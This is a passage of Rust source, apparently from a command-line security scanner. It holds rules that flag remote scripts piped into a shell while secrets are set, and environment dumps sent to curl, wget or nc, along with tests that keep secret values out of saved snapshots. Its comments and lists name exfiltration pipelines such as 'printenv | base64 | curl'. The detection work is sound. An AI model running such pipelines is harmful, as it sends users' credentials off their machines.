    }
    let parent = path
        .parent()
        .filter(|parent| !parent.as_os_str().is_empty())
        .unwrap_or_else(|| Path::new("."));
    std::fs::create_dir_all(parent)?;
    let mut snapshot = snapshot.clone();
    snapshot.migrate_presence_only(extra_sensitive);
    let json = serde_json::to_string_pretty(&snapshot)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;

    let mut temporary = tempfile::NamedTempFile::new_in(parent)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        temporary
            .as_file()
            .set_permissions(std::fs::Permissions::from_mode(0o600))?;
    }
    use std::io::Write as _;
    temporary.write_all(json.as_bytes())?;
    temporary.flush()?;
    temporary.as_file().sync_all()?;
    temporary.persist(path).map_err(|error| error.error)?;
    #[cfg(unix)]
    {
        // Durably publish the rename itself. Without a directory fsync, a
        // reported-success crash can resurrect the pre-migration snapshot.
        std::fs::File::open(parent)?.sync_all()?;
    }
    Ok(())
}

// ─── engine-path rules ─────────────────────────────────────────────────────

/// Build the `EnvSensitiveExposedToUnknownScript` finding (High) when a
/// sensitive env var is set AND the command pipes remote content to a shell
/// (`curl … | bash`, etc.). `set_sensitive` (the set sensitive var NAMES) is
/// passed in so the rule is unit-testable without an env mutation. `None` when
/// no sensitive var is set or the command is not pipe-to-interpreter.
pub fn check_sensitive_exposed_to_unknown_script(
    cmd: &str,
    shell: ShellType,
    set_sensitive: &[String],
) -> Option<Finding> {
    let safe_names = set_sensitive
        .iter()
        .filter_map(|name| privacy_safe_env_name(name))
        .collect::<Vec<_>>();
    if safe_names.is_empty() {
        return None;
    }
    if !is_pipe_to_interpreter_shape(cmd, shell) {
        return None;
    }
    // List the exposed var NAMES (never values) in the evidence.
    let names = safe_names.join(", ");
    Some(Finding {
        rule_id: RuleId::EnvSensitiveExposedToUnknownScript,
        severity: Severity::High,
        title: "Sensitive env var exposed to an unknown downloaded script".to_string(),
        description: format!(
            "{} sensitive environment variable(s) are set and this command pipes \
             remote content into a shell interpreter. A malicious script inherits \
             and can exfiltrate them. Exposed: {names}.",
            safe_names.len()
        ),
        evidence: vec![Evidence::Text {
            detail: format!("sensitive_env_set={names}"),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    })
}

/// Build the `EnvPrintenvToNetworkSink` finding (Medium) when an environment
/// DUMP (`printenv` / bare `env`) reaches a network sink (`curl`/`wget`/`nc`)
/// through a pipe chain. Environment-data taint is propagated through
/// pipe-connected segments — including data-preserving transforms such as
/// encoders, compressors, and filters — so `printenv | base64 | curl ...`
/// still fires; wrapper chains (`sudo`/`env`/`command`/`time`) are resolved
/// for both the dump and the sink, so `printenv | command curl ...` fires too.
/// Taint stops at any non-pipe separator and at commands outside the known
/// data-preserving set, so an unrelated `env` earlier in a chain is not blamed
/// for a later sink. A dump is a bare `printenv` (no var-name arg) or `env`
/// with no command word.
pub fn check_printenv_to_network_sink(cmd: &str, shell: ShellType) -> Option<Finding> {
    let segs = crate::tokenize::tokenize(cmd, shell);
    if segs.len() < 2 {
        return None;
    }
    // Walk the pipeline, tracking whether the current stream carries dumped
    // environment data. A dump taints the stream; the taint flows through
    // pipes and data-preserving transforms and is discharged by a network
    // sink. Any non-pipe separator (or an unknown command) clears it.
    let mut tainted = false;
    let matched = segs.iter().any(|seg| {
        if !matches!(
            seg.preceding_separator.as_deref(),
            None | Some("|") | Some("|&")
        ) {
            tainted = false;
        }
        if segment_is_env_dump(seg, shell) {
            tainted = true;
            return false;
        }
        if !tainted {
            return false;
        }
        let leader = crate::extract::resolve_wrapped_command_for_shell(seg, shell)
            .map(|(name, _)| name)
            .unwrap_or_else(|| base_command(seg.command.as_deref().unwrap_or(""), shell));
        if is_network_sink(&leader) {
            return true;
        }
        // Unknown commands may consume or discard the stream; only known
        // data-preserving transforms keep the taint flowing.
        if !is_data_preserving_transform(&leader) {
            tainted = false;
        }
        false
    });
    if !matched {
        return None;
    }
    Some(Finding {
        rule_id: RuleId::EnvPrintenvToNetworkSink,
        severity: Severity::Medium,
        title: "Environment dumped to a network sink".to_string(),
        description: "`printenv`/`env` is piped into a network tool (curl / wget / nc), \
                      which sends every environment variable — including any secrets — \
                      off the machine."
            .to_string(),
        evidence: vec![Evidence::Text {
            detail: "printenv|env piped to network sink".to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    })
}

/// `true` when `cmd` is a `<fetch> URL | <shell>` shape with the fetch and shell
/// as ADJACENT pipe segments, so `curl … >/tmp/x; echo hi | bash` does NOT fire.
/// Mirrors the `safe_command` pipe-to-shell recognition, boolean-only.
fn is_pipe_to_interpreter_shape(cmd: &str, shell: ShellType) -> bool {
    let segs = crate::tokenize::tokenize(cmd, shell);
    if segs.len() < 2 {
        return false;
    }
    segs.windows(2).any(|pair| {
        let source = &pair[0];
        let sink = &pair[1];
        // Unwrap BOTH sides through `sudo`/`env`/`command`/`time`/`tirith` so
        // wrapped fetches (`sudo curl …`, `env curl …`) AND wrapped shells
        // (`… | env bash`, `… | command bash`) are still recognized; the leader
        // would otherwise be the wrapper word. `resolve_wrapped_command` returns
        // the lowercased base name (or `None` when the wrapper chain has no
        // command word, e.g. bare `sudo`).
        let source_fetches = crate::extract::resolve_wrapped_command_for_shell(source, shell)
            .is_some_and(|(name, _)| is_url_fetch_command(&name));
        let sink_is_shell = crate::extract::resolve_wrapped_command_for_shell(sink, shell)
            .is_some_and(|(name, _)| is_shell_interpreter(&name));
        matches!(sink.preceding_separator.as_deref(), Some("|") | Some("|&"))
            && source_fetches
            && sink_is_shell
    })
}

/// Data-preserving pipeline transforms: bytes fed on stdin leave (encoded,
/// compressed, encrypted, or filtered) on stdout, so environment-data taint
/// flows through them toward a later network sink. Deliberately a closed set:
/// an unrecognized command may parse, aggregate, or discard its input
/// (`wc -c`, `sha256sum`), so propagation stops there rather than risk blaming
/// a downstream sink for data it never received.
pub(crate) fn is_data_preserving_transform(name: &str) -> bool {
    matches!(
        name,
        // encoders / encryptors
        "base64"
            | "base32"
            | "uuencode"
            | "openssl"
            | "gpg"
            | "gpg2"
            | "age"
            // compressors
            | "gzip"
            | "gunzip"
            | "bzip2"
            | "bunzip2"
            | "xz"
            | "unxz"
            | "zstd"
            | "unzstd"
            | "compress"
            | "uncompress"
            // pass-through filters
            | "cat"
            | "tee"
            | "tr"
            | "sed"
            | "awk"
            | "gawk"
            | "mawk"
            | "grep"
            | "egrep"
            | "fgrep"
            | "cut"
            | "sort"
            | "uniq"
            | "head"
            | "tail"
            | "xxd"
            | "od"
            | "rev"
            | "fold"
            | "fmt"
            | "iconv"
            | "jq"
            | "yq"
    )
}

/// `true` when `seg` is an environment DUMP: a bare `printenv` (no var-name arg)
/// or `env` with no command word. `printenv AWS_REGION` / `env FOO=1 cmd` are
/// not dumps. Wrapper chains are resolved first, so `command printenv` and
/// `sudo env` are classified by the wrapped command, not the wrapper word.
fn segment_is_env_dump(seg: &crate::tokenize::Segment, shell: ShellType) -> bool {
    let (leader, args) = match crate::extract::resolve_wrapped_command_for_shell(seg, shell) {
        Some((name, args)) => (name, args),
        // A wrapper chain with NO command word (`env FOO=1`, bare `sudo`) does
        // not resolve; fall back to the literal leader + args so a bare `env`
        // is still recognized as a dump below.
        None => (
            base_command(seg.command.as_deref().unwrap_or(""), shell),
            seg.args.clone(),
        ),
    };
    match leader.as_str() {
        // Flags (`-0`) are fine; any non-flag arg names a specific variable.
        "printenv" => !args.iter().any(|a| !a.starts_with('-')),
        // bare `env` (only flags / `VAR=val` assignments, no command word).
        "env" => args.iter().all(|a| a.starts_with('-') || a.contains('=')),
        _ => false,
    }
}

fn is_url_fetch_command(cmd: &str) -> bool {
    matches!(cmd, "curl" | "wget" | "http" | "https" | "xh" | "fetch")
}

fn is_shell_interpreter(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "ash"
    )
}

fn is_network_sink(name: &str) -> bool {
    matches!(
        name,
        "curl" | "wget" | "nc" | "ncat" | "netcat" | "http" | "https" | "xh"
    )
}

/// Reduce a command token to its base name (strip dir path + a PowerShell
/// `.exe`). Local copy mirroring `safe_command::base_command`.
fn base_command(cmd: &str, shell: ShellType) -> String {
    let stripped = strip_quotes(cmd);
    let base = stripped
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(&stripped)
        .to_string();
    if shell == ShellType::PowerShell {
        base.strip_suffix(".exe")
            .or_else(|| base.strip_suffix(".EXE"))
            .unwrap_or(&base)
            .to_ascii_lowercase()
    } else {
        base
    }
}

fn strip_quotes(s: &str) -> String {
    let t = s.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        t[1..t.len() - 1].to_string()
    } else {
        t.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(unix)]
    struct TestProcessEnv(Vec<(std::ffi::OsString, Option<std::ffi::OsString>)>);

    #[cfg(unix)]
    impl TestProcessEnv {
        fn new() -> Self {
            Self(Vec::new())
        }

        fn set(&mut self, name: std::ffi::OsString, value: std::ffi::OsString) {
            let previous = std::env::var_os(&name);
            // SAFETY: the test owns GlobalStateGuard's process-global lock until
            // this guard restores every entry.
            unsafe { std::env::set_var(&name, value) };
            self.0.push((name, previous));
        }

        fn remove(&mut self, name: std::ffi::OsString) {
            let previous = std::env::var_os(&name);
            // SAFETY: the test owns the crate-wide environment lock until this
            // guard restores every entry.
            unsafe { std::env::remove_var(&name) };
            self.0.push((name, previous));
        }
    }

    #[cfg(unix)]
    impl Drop for TestProcessEnv {
        fn drop(&mut self) {
            for (name, previous) in self.0.drain(..).rev() {
                // SAFETY: the owning test still holds GlobalStateGuard.
                unsafe {
                    match previous {
                        Some(value) => std::env::set_var(name, value),
                        None => std::env::remove_var(name),
                    }
                }
            }
        }
    }

    fn s(v: &str) -> String {
        v.to_string()
    }

    // ── snapshot compatibility + presence-only persistence ───────────────

    #[test]
    fn value_hash8_is_8_chars_and_value_free() {
        let h = value_hash8("super-secret-token-value");
        assert_eq!(h.len(), 8);
        assert!(h.chars().all(|c| c.is_ascii_hexdigit()));
        // The hash must not contain the value.
        assert!(!h.contains("secret"));
    }

    #[test]
    fn value_hash8_empty_value_is_empty() {
        assert_eq!(value_hash8(""), "");
    }

    #[test]
    fn snapshot_serialization_is_presence_only_and_rpc_names_are_not_baselined() {
        let snap = EnvSnapshot::from_env_pairs(
            [
                ("AWS_SECRET_ACCESS_KEY", "AKIAsecretvalue"),
                ("RPC_URL", "https://rpc.example"),
                (
                    "ETH_RPC_URL",
                    "https://rpc.example/v3/providerToken123456789?api_key=hunter2",
                ),
                ("PATH", "/usr/bin"),
            ],
            123,
        );
        let v = snap.vars.get("AWS_SECRET_ACCESS_KEY").unwrap();
        assert_eq!(v.value_hash8, "");
        assert!(!snap.vars.contains_key("RPC_URL"));
        assert!(!snap.vars.contains_key("ETH_RPC_URL"));
        assert_eq!(snap.vars["PATH"].value_hash8, "");
        let json = serde_json::to_string(&snap).unwrap();
        assert!(!json.contains("AKIAsecretvalue"), "{json}");
        assert!(!json.contains(&value_hash8("AKIAsecretvalue")), "{json}");
        assert!(!json.contains("providerToken123456789"), "{json}");
        assert!(
            !json.contains(&value_hash8("providerToken123456789")),
            "{json}"
        );
        assert!(json.contains("AWS_SECRET_ACCESS_KEY"));
    }

    #[cfg(unix)]
    #[test]
    fn current_process_snapshot_never_text_converts_values_and_skips_non_utf8_names() {
        use std::os::unix::ffi::OsStringExt as _;

        let _global = tirith_test_support::GlobalStateGuard::new()
            .expect("isolate process-global environment-guard state");
        let mut restore = TestProcessEnv::new();
        let safe_name = std::ffi::OsString::from("TIRITH_C04_NON_UTF8_VALUE");
        restore.set(
            safe_name,
            std::ffi::OsString::from_vec(vec![b'v', b'a', b'l', b'u', b'e', 0xff]),
        );
        restore.set(
            std::ffi::OsString::from("TIRITH_C04_EMPTY_VALUE"),
            std::ffi::OsString::new(),
        );
        let unsafe_name = std::ffi::OsString::from_vec(b"TIRITH_C04_NON_UTF8_NAME_\xff".to_vec());
        restore.set(unsafe_name, std::ffi::OsString::from("set"));

        let snapshot = EnvSnapshot::from_current_process_with_sensitive(&[]);
        assert!(snapshot.vars.contains_key("TIRITH_C04_NON_UTF8_VALUE"));
        assert!(!snapshot.vars.contains_key("TIRITH_C04_EMPTY_VALUE"));
        assert_eq!(snapshot.vars["TIRITH_C04_NON_UTF8_VALUE"].value_hash8, "");
        let public = serde_json::to_string(&snapshot).unwrap();
        assert!(public.contains("TIRITH_C04_NON_UTF8_VALUE"), "{public}");
        assert!(!public.contains("TIRITH_C04_NON_UTF8_NAME"), "{public}");

        let current = current_sensitive_in_process(&[s("TIRITH_C04_NON_UTF8_VALUE")]);
        assert_eq!(
            current.get("TIRITH_C04_NON_UTF8_VALUE").map(String::as_str),
            Some("")
        );
        assert!(!current.contains_key("TIRITH_C04_NON_UTF8_NAME"));
    }

    #[cfg(unix)]
    #[test]
    fn production_presence_markers_do_not_leak_or_claim_same_and_changed_values_unchanged() {
        let mut global = tirith_test_support::GlobalStateGuard::new()
            .expect("isolate process-global environment-guard state");
        // The shared guard deliberately installs a KUBECONFIG fixture, which is
        // itself a production-sensitive environment variable. This test is
        // scoped to the policy extension below, so remove that unrelated fixture
        // while retaining the guard's serialization and panic-safe restoration.
        global.remove_env("KUBECONFIG");
        let mut restore = TestProcessEnv::new();
        let name = "TIRITH_C04_POLICY_SECRET";
        let first = "wallet-secret-first-value";
        let replacement = "wallet-secret-replacement-value";
        // Host runners often export SSH_AUTH_SOCK. It is a default sensitive
        // name, so leaving it installed would add a second unavailable marker.
        restore.remove("SSH_AUTH_SOCK".into());
        restore.set(name.into(), first.into());

        let sensitive = vec![s(name)];
        let snapshot = EnvSnapshot::from_current_process_with_sensitive(&sensitive);
        let same = current_sensitive_in_process(&sensitive);
        assert_eq!(same.get(name).map(String::as_str), Some(""));
        let same_diff = diff_sensitive(&snapshot, &same, &sensitive);
        assert_eq!(same_diff.len(), 1, "{same_diff:?}");
        assert_eq!(same_diff[0].delta, EnvDelta::ValueComparisonUnavailable);
        for rendered in [format!("{same:?}"), serde_json::to_string(&same).unwrap()] {
            assert!(!rendered.contains(first), "{rendered}");
            assert!(!rendered.contains(&value_hash8(first)), "{rendered}");
        }

        restore.set(name.into(), replacement.into());
        let changed = current_sensitive_in_process(&sensitive);
        let diff = diff_sensitive(&snapshot, &changed, &sensitive);
        assert_eq!(diff.len(), 1, "{diff:?}");
        assert_eq!(diff[0].delta, EnvDelta::ValueComparisonUnavailable);
        for rendered in [
            format!("{changed:?}"),
            serde_json::to_string(&changed).unwrap(),
        ] {
            assert!(!rendered.contains(replacement), "{rendered}");
            assert!(!rendered.contains(&value_hash8(replacement)), "{rendered}");
        }
    }

    #[test]
    fn sensitive_snapshot_is_independent_of_secret_value_and_prefix_family() {
        let left = EnvSnapshot::from_env_pairs(
            [
                ("WALLET_PRIVATE_KEY", "first-wallet-secret"),
                ("AWS_SECRET_CUSTOM", "first-cloud-secret"),
            ],
            7,
        );
        let right = EnvSnapshot::from_env_pairs(
            [
                ("WALLET_PRIVATE_KEY", "different-wallet-secret"),
                ("AWS_SECRET_CUSTOM", "different-cloud-secret"),
            ],
            7,
        );
        assert_eq!(
            serde_json::to_string(&left).unwrap(),
            serde_json::to_string(&right).unwrap()
        );
        assert!(left.vars.values().all(|var| var.value_hash8.is_empty()));
    }

    #[test]
    fn policy_sensitive_extension_is_presence_only() {
        let extra = vec![s("MY_PRIVATE_WALLET")];
        let snapshot = EnvSnapshot::from_env_pairs_with_sensitive(
            [("MY_PRIVATE_WALLET", "do-not-hash-me"), ("LANG", "en_US")],
            1,
            &extra,
        );
        assert_eq!(snapshot.vars["MY_PRIVATE_WALLET"].value_hash8, "");
        assert_eq!(snapshot.vars["LANG"].value_hash8, "");
        let json = serde_json::to_string(&snapshot).unwrap();
        assert!(!json.contains(&value_hash8("do-not-hash-me")), "{json}");
    }

    #[test]
    fn public_snapshot_construction_cannot_serialize_or_debug_unknown_hashes() {
        let canary = value_hash8("wallet-secret-canary");
        let variable = SnapshotVar {
            name: "REMOVED_POLICY_WALLET".to_string(),
            value_hash8: canary.clone(),
        };
        let json = serde_json::to_string(&variable).unwrap();
        let debug = format!("{variable:?}");
        assert!(!json.contains(&canary), "{json}");
        assert!(!debug.contains(&canary), "{debug}");
        assert!(json.contains(r#""value_hash8":"""#), "{json}");

        let known_secret = SnapshotVar {
            name: "WALLET_PRIVATE_KEY".to_string(),
            value_hash8: canary.clone(),
        };
        assert!(!serde_json::to_string(&known_secret)
            .unwrap()
            .contains(&canary));
        assert!(!format!("{known_secret:?}").contains(&canary));

        let restored: SnapshotVar = serde_json::from_str(&format!(
            r#"{{"name":"REMOVED_POLICY_WALLET","value_hash8":"{canary}"}}"#
        ))
        .unwrap();
        assert_eq!(restored.value_hash8, "");

        let public = SnapshotVar {
            name: "LANG".to_string(),
            value_hash8: "12345678".to_string(),
        };
        assert!(!serde_json::to_string(&public).unwrap().contains("12345678"));
        assert!(!format!("{public:?}").contains("12345678"));
        let forged_raw = SnapshotVar {
            name: "LANG".to_string(),
            value_hash8: "RAW-WALLET-SECRET".to_string(),
        };
        assert!(!serde_json::to_string(&forged_raw)
            .unwrap()
            .contains("RAW-WALLET-SECRET"));
        assert!(!format!("{forged_raw:?}").contains("RAW-WALLET-SECRET"));
        let restored: SnapshotVar =
            serde_json::from_str(r#"{"name":"LANG","value_hash8":"RAW-WALLET-SECRET"}"#).unwrap();
        assert_eq!(restored.value_hash8, "");

        let mismatched = EnvSnapshot {
            schema_version: 2,
            taken_at: 1,
            vars: BTreeMap::from([(
                "REMOVED_POLICY_WALLET".to_string(),
                SnapshotVar {
                    name: "LANG".to_string(),
                    value_hash8: canary.clone(),
                },
            )]),
        };
        let json = serde_json::to_string(&mismatched).unwrap();
        let debug = format!("{mismatched:?}");
        assert!(!json.contains(&canary), "{json}");
        assert!(!debug.contains(&canary), "{debug}");

        let secret = "wallet-secret-never-public";
        let snapshot = EnvSnapshot::from_env_pairs([("WALLET_PRIVATE_KEY", secret)], 1);
        assert_eq!(snapshot.vars["WALLET_PRIVATE_KEY"].value_hash8, "");
        for rendered in [
            serde_json::to_string(&snapshot).unwrap(),
            format!("{snapshot:?}"),
        ] {
            assert!(!rendered.contains(secret), "{rendered}");
            assert!(!rendered.contains(&value_hash8(secret)), "{rendered}");
        }
    }

    #[test]
    fn secret_bearing_environment_names_are_dropped_or_projected_at_every_boundary() {
        let canary = format!("ghp_canary_{}", "A".repeat(30));
        let snapshot = EnvSnapshot::from_env_pairs(
            [(canary.as_str(), "set"), ("AWS_SECRET_ACCESS_KEY", "set")],
            7,
        );
        assert!(!snapshot.vars.contains_key(&canary));
        assert!(snapshot.vars.contains_key("AWS_SECRET_ACCESS_KEY"));

        let forged = SnapshotVar {
            name: canary.clone(),
            value_hash8: String::new(),
        };
        let json = serde_json::to_string(&forged).unwrap();
        let debug = format!("{forged:?}");
        assert!(!json.contains(&canary), "{json}");
        assert!(!debug.contains(&canary), "{debug}");

        let diff = EnvDiffEntry {
            name: canary.clone(),
            delta: EnvDelta::NewlySet,
        };
        assert!(!serde_json::to_string(&diff).unwrap().contains(&canary));
        assert!(!format!("{diff:?}").contains(&canary));

        let explained = explain_var_in(&canary, None);
        assert_eq!(explained.name, REDACTED_ENV_NAME);
        assert!(!serde_json::to_string(&explained).unwrap().contains(&canary));
        assert!(!format!("{explained:?}").contains(&canary));

        let source = EnvSource {
            file: format!("/Users/alice/private/{canary}/.zshrc"),
            line: 1,
            masked_line: format!("export {canary}=****"),
        };
        for rendered in [
            serde_json::to_string(&source).unwrap(),
            format!("{source:?}"),
        ] {
            assert!(!rendered.contains(&canary), "{rendered}");
            assert!(!rendered.contains("/Users/alice"), "{rendered}");
            assert!(rendered.contains("REDACTED"), "{rendered}");
        }

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("env_snapshot.json");
        std::fs::write(
            &path,
            format!(
                r#"{{"schema_version":3,"taken_at":7,"vars":{{"{canary}":{{"name":"{canary}","value_hash8":""}}}}}}"#
            ),
        )
        .unwrap();
        let loaded = load_snapshot_and_migrate(&path, &[]).unwrap();
        assert!(!loaded.vars.contains_key(&canary));
        let rewritten = std::fs::read_to_string(&path).unwrap();
        assert!(!rewritten.contains(&canary), "{rewritten}");
    }

    #[test]
    fn unknown_and_removed_policy_names_remain_presence_only_on_persistence() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("env_snapshot.json");
        let canary = value_hash8("removed-policy-secret");
        let snapshot = EnvSnapshot {
            schema_version: 2,
            taken_at: 7,
            vars: BTreeMap::from([(
                "REMOVED_POLICY_WALLET".to_string(),
                SnapshotVar {
                    name: "REMOVED_POLICY_WALLET".to_string(),
                    value_hash8: canary.clone(),
                },
            )]),
        };
        save_snapshot(&path, &snapshot).unwrap();
        let persisted = std::fs::read_to_string(&path).unwrap();
        assert!(!persisted.contains(&canary), "{persisted}");
        assert!(persisted.contains("value_hash8"), "{persisted}");

        let legacy_canary = value_hash8("previous-policy-secret");
        std::fs::write(
            &path,
            format!(
                r#"{{"schema_version":2,"taken_at":7,"vars":{{"REMOVED_POLICY_WALLET":{{"name":"REMOVED_POLICY_WALLET","value_hash8":"{legacy_canary}"}}}}}}"#
            ),
        )
        .unwrap();
        let loaded = load_snapshot_and_migrate(&path, &[]).unwrap();
        assert_eq!(loaded.vars["REMOVED_POLICY_WALLET"].value_hash8, "");
        let rewritten = std::fs::read_to_string(&path).unwrap();
        assert!(!rewritten.contains(&legacy_canary), "{rewritten}");
        assert!(rewritten.contains("value_hash8"), "{rewritten}");

        let mismatched_canary = value_hash8("mismatched-map-secret");
        std::fs::write(
            &path,
            format!(
                r#"{{"schema_version":2,"taken_at":7,"vars":{{"REMOVED_POLICY_WALLET":{{"name":"LANG","value_hash8":"{mismatched_canary}"}}}}}}"#
            ),
        )
        .unwrap();
        let loaded = load_snapshot_and_migrate(&path, &[]).unwrap();
        assert_eq!(
            loaded.vars["REMOVED_POLICY_WALLET"].name,
            "REMOVED_POLICY_WALLET"
        );
        assert_eq!(loaded.vars["REMOVED_POLICY_WALLET"].value_hash8, "");
        let rewritten = std::fs::read_to_string(&path).unwrap();
        assert!(!rewritten.contains(&mismatched_canary), "{rewritten}");
    }

    #[test]
    fn snapshot_round_trips_through_json() {
        let snap = EnvSnapshot::from_env_pairs([("GITHUB_TOKEN", "ghp_xxx")], 7);
        assert_eq!(snap.vars["GITHUB_TOKEN"].value_hash8, "");
        let json = serde_json::to_string(&snap).unwrap();
        let back: EnvSnapshot = serde_json::from_str(&json).unwrap();
        assert_eq!(back.vars.len(), 1);
        assert_eq!(back.taken_at, 7);
        assert_eq!(back.vars["GITHUB_TOKEN"].value_hash8, "");
    }

    #[test]
    fn legacy_snapshot_migration_discards_value_markers_for_every_name() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("env_snapshot.json");
        std::fs::write(
            &path,
            r#"{
                "schema_version": 1,
                "taken_at": 7,
                "vars": {
                    "AWS_SECRET_ACCESS_KEY": {
                        "name": "AWS_SECRET_ACCESS_KEY",
                        "value_hash8": "deadbeef"
                    },
                    "MY_PRIVATE_WALLET": {
                        "name": "MY_PRIVATE_WALLET",
                        "value_hash8": "cafebabe"
                    },
                    "LANG": {
                        "name": "LANG",
                        "value_hash8": "12345678"
                    }
                }
            }"#,
        )
        .unwrap();

        let snapshot =
            load_snapshot_and_migrate(&path, &["MY_PRIVATE_WALLET".to_string()]).unwrap();
        assert_eq!(snapshot.schema_version, 3);
        assert_eq!(snapshot.vars["AWS_SECRET_ACCESS_KEY"].value_hash8, "");
        assert_eq!(snapshot.vars["MY_PRIVATE_WALLET"].value_hash8, "");
        assert_eq!(snapshot.vars["LANG"].value_hash8, "");

        let persisted = std::fs::read_to_string(path).unwrap();
        assert!(!persisted.contains("deadbeef"), "{persisted}");
        assert!(!persisted.contains("cafebabe"), "{persisted}");
        assert!(!persisted.contains("12345678"), "{persisted}");
    }

    #[test]
    fn legacy_migration_persist_failure_returns_error_and_preserves_original() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("env_snapshot.json");
        let legacy = r#"{
            "schema_version":1,
            "vars":{"AWS_SECRET_CUSTOM":{"name":"AWS_SECRET_CUSTOM","value_hash8":"deadbeef"}}
        }"#;
        std::fs::write(&path, legacy).unwrap();
        let result = load_snapshot_and_migrate_with(&path, &[], |_, _, _| {
            Err(std::io::Error::other("injected atomic persist failure"))
        });
        assert!(result.is_err());
        assert_eq!(std::fs::read_to_string(path).unwrap(), legacy);
    }

    #[test]
    fn future_snapshot_schema_is_rejected_without_rewriting_any_byte() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("env_snapshot.json");
        let future = r#"{
  "schema_version": 4,
  "future_guard": {"mode": "must-survive"},
  "vars": {"RPC_URL": {"name": "RPC_URL", "value_hash8": "legacy"}}
}"#;
        std::fs::write(&path, future).unwrap();

        let error = load_snapshot_and_migrate(&path, &[]).unwrap_err();
        assert_eq!(error.kind(), std::io::ErrorKind::InvalidData);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), future);
        assert!(save_snapshot(&path, &EnvSnapshot::default()).is_err());
        assert_eq!(std::fs::read_to_string(&path).unwrap(), future);

        let future_snapshot = EnvSnapshot {
            schema_version: CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION + 1,
            taken_at: 0,
            vars: BTreeMap::new(),
        };
        let destination = dir.path().join("future-save.json");
        assert!(save_snapshot(&destination, &future_snapshot).is_err());
        assert!(!destination.exists());
    }

    // ── diff ──────────────────────────────────────────────────────────────

    #[test]
    fn diff_reports_newly_set_sensitive_var() {
        let snap = EnvSnapshot::from_env_pairs(Vec::<(&str, &str)>::new(), 0);
        let mut current = BTreeMap::new();
        current.insert(s("AWS_SECRET_ACCESS_KEY"), String::new());
        let sensitive = vec![s("AWS_SECRET_ACCESS_KEY"), s("GITHUB_TOKEN")];
        let diff = diff_sensitive(&snap, &current, &sensitive);
        assert_eq!(diff.len(), 1);
        assert_eq!(diff[0].name, "AWS_SECRET_ACCESS_KEY");
        assert_eq!(diff[0].delta, EnvDelta::NewlySet);
    }

    #[test]
    fn legacy_nonempty_markers_still_distinguish_same_and_changed_values() {
        let snap = EnvSnapshot {
            schema_version: CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION,
            taken_at: 0,
            vars: BTreeMap::from([(
                s("WALLET_PRIVATE_KEY"),
                SnapshotVar {
                    name: s("WALLET_PRIVATE_KEY"),
                    value_hash8: value_hash8("old-secret"),
                },
            )]),
        };
        let sensitive = vec![s("WALLET_PRIVATE_KEY")];

        let same = BTreeMap::from([(s("WALLET_PRIVATE_KEY"), value_hash8("old-secret"))]);
        assert!(diff_sensitive(&snap, &same, &sensitive).is_empty());

        let current =
            BTreeMap::from([(s("WALLET_PRIVATE_KEY"), value_hash8("replacement-secret"))]);
        let diff = diff_sensitive(&snap, &current, &sensitive);
        assert_eq!(diff.len(), 1);
        assert_eq!(diff[0].delta, EnvDelta::ValueChanged);
    }

    #[test]
    fn persisted_presence_baseline_reports_comparison_unavailable_after_restart() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("env_snapshot.json");
        let secret = "wallet-secret-never-durable";
        let snapshot = EnvSnapshot::from_env_pairs([("WALLET_PRIVATE_KEY", secret)], 0);
        assert_eq!(snapshot.vars["WALLET_PRIVATE_KEY"].value_hash8, "");

        save_snapshot(&path, &snapshot).unwrap();
        let persisted = std::fs::read_to_string(&path).unwrap();
        assert!(!persisted.contains(secret), "{persisted}");
        assert!(!persisted.contains(&value_hash8(secret)), "{persisted}");

        let reloaded = load_snapshot_and_migrate(&path, &[]).unwrap();
        assert_eq!(reloaded.vars["WALLET_PRIVATE_KEY"].value_hash8, "");
        for scenario in ["same value", "changed value"] {
            let current = BTreeMap::from([(s("WALLET_PRIVATE_KEY"), String::new())]);
            let diff = diff_sensitive(&reloaded, &current, &[s("WALLET_PRIVATE_KEY")]);
            assert_eq!(diff.len(), 1, "{scenario}: {diff:?}");
            assert_eq!(
                diff[0].delta,
                EnvDelta::ValueComparisonUnavailable,
                "a presence-only restart boundary must never claim unchanged"
            );
        }

        let json = serde_json::to_string(&diff_sensitive(
            &reloaded,
            &BTreeMap::from([(s("WALLET_PRIVATE_KEY"), String::new())]),
            &[s("WALLET_PRIVATE_KEY")],
        ))
        .unwrap();
        assert!(json.contains("value_comparison_unavailable"), "{json}");
        assert!(!json.contains(secret), "{json}");
    }

    #[test]
    fn public_to_credential_rpc_transition_is_reported_as_newly_sensitive() {
        let snapshot = EnvSnapshot::from_env_pairs(
            [("RPC_URL", "https://rpc.example/v3/mainnet?chain=mainnet")],
            0,
        );
        assert!(!snapshot.vars.contains_key("RPC_URL"));
        let current = BTreeMap::from([("RPC_URL".to_string(), String::new())]);
        let diff = diff_sensitive(&snapshot, &current, &[]);
        assert_eq!(diff.len(), 1);
        assert_eq!(diff[0].name, "RPC_URL");
        assert_eq!(diff[0].delta, EnvDelta::NewlySet);
    }

    #[test]
    fn diff_ignores_unchanged_and_unset_values() {
        let snap = EnvSnapshot {
            schema_version: CURRENT_ENV_SNAPSHOT_SCHEMA_VERSION,
            taken_at: 0,
            vars: BTreeMap::from([
                (
                    s("WALLET_PRIVATE_KEY"),
                    SnapshotVar {
                        name: s("WALLET_PRIVATE_KEY"),
                        value_hash8: value_hash8("same"),
                    },
                ),
                (
                    s("NPM_TOKEN"),
                    SnapshotVar {
                        name: s("NPM_TOKEN"),
                        value_hash8: value_hash8("removed"),
                    },
                ),
            ]),
        };
